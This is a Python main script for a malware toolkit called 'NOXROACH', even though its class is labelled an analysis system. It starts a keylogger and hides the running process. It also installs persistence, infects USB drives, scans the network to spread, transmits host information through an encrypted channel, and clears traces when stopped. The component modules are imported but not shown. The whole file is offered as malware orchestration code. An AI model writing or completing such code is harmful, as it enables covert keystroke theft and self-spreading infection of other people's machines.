# -*- coding: utf-8 -*- 
import sys 
import os 
import threading 
import time 
from datetime import datetime 
import logging 
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__))) 
from config import Config 
from core.keylogger import Keylogger 
from core.detector import EnhancedDetector 
from core.analyzer import AdvancedAnalyzer 
from core.stealth import StealthManager 
from core.encryption import EncryptionManager 
from transmission.hybrid import HybridTransmission 
from spread.usb import USBSpread 
from spread.network import NetworkSpread 
from spread.persistence import PersistenceMechanisms 
from dashboard.web_dashboard import WebDashboard 
from utils.helpers import get_system_info, is_admin 
from utils.logging import setup_logging 
class MalwareAnalysisSystem: 
    def __init__(self): 
        self.logger = logging.getLogger() 
        self.logger.info("=" * 60) 
        self.logger.info("NOXROACH SYSTEM STARTING") 
        self.logger.info("=" * 60) 
        self.system_info = get_system_info() 
        self.logger.info(f"System: {self.system_info['hostname']} ({self.system_info['ip']})") 
        self.logger.info(f"User: {self.system_info['username']}") 
        self._init_components() 
        self.running = False 
        self.start_time = datetime.now() 
        self.logger.info("[A] System initialized") 
    def _init_components(self): 
        self.keylogger = Keylogger() 
        self.detector = EnhancedDetector(Config.PATHS['analysis_dir']) 
        self.analyzer = AdvancedAnalyzer(Config.PATHS['analysis_dir']) 
        self.stealth = StealthManager() 
        self.encryption = EncryptionManager() 
        self.transmitter = HybridTransmission() 
        self.usb_spread = USBSpread() 
        self.network_spread = NetworkSpread() 
        self.persistence = PersistenceMechanisms() 
        self.dashboard = WebDashboard(Config.PATHS['analysis_dir']) 
        self.logger.info("[A] All components initialized") 
    def start(self): 
        if self.running: return 
        self.running = True 
        if Config.STEALTH_CONFIG.get('hide_process', True): 
            self.stealth.apply_stealth() 
        if Config.SPREAD_CONFIG.get('persistence', True): 
            self.persistence.install() 
        self.keylogger.start() 
        threading.Thread(target=self.dashboard.run, args=('127.0.0.1', 5000), daemon=True).start() 
        threading.Thread(target=self._process_loop, daemon=True).start() 
        if Config.SPREAD_CONFIG.get('usb_infection', True): 
            threading.Thread(target=self.usb_spread.infect, daemon=True).start() 
        if Config.SPREAD_CONFIG.get('network_scanning', True): 
            threading.Thread(target=self.network_spread.scan_and_spread, daemon=True).start() 
        self.logger.info("[A] System started") 
        self.logger.info("[*] Dashboard available at http://127.0.0.1:5000") 
    def _process_loop(self): 
        batch = [] 
        while self.running: 
            keystroke = self.keylogger.get_keystroke(timeout=1) 
            if keystroke: 
                batch.append(keystroke) 
                self.dashboard.update_data(keystroke) 
                if len(batch):
                    self._process_batch(batch) 
                    batch = [] 
    def _process_batch(self, batch): 
        try: 
            detection = self.detector.analyze(batch) 
            self.analyzer.analyze(batch) 
            if detection.get('threats'): 
                for threat in detection['threats']: 
                    self.logger.warning(f"[!] Threat: {threat['type']} - {threat['matched']}") 
        except Exception as e: 
            self.logger.error(f"Batch processing failed: {e}") 
    def _transmit_data(self): 
        try: 
            import json 
            data = {'session_id': Config.SESSION_ID, 'timestamp': datetime.now().isoformat(), 'system_info': self.system_info} 
            self.transmitter.send(json.dumps(data)) 
        except Exception as e: 
            self.logger.error(f"Transmission failed: {e}") 
    def stop(self): 
        self.running = False 
        self.keylogger.stop() 
        self.stealth.clean_traces() 
        self.logger.info("[A] System stopped") 
def main(): 
    if not is_admin(): 
        print("Warning: Not running as administrator.") 
    system = MalwareAnalysisSystem() 
    system.start() 
    print("\n" + "=" * 60) 
    print("NOXROACH SYSTEM RUNNING") 
    print("=" * 60) 
    print("Dashboard: http://127.0.0.1:5000") 
    print("Press Ctrl+C to stop\n") 
    try: 
        while True: time.sleep(1) 
    except KeyboardInterrupt: 
        system.stop() 
        sys.exit(0) 
if __name__ == "__main__": 
    main() 
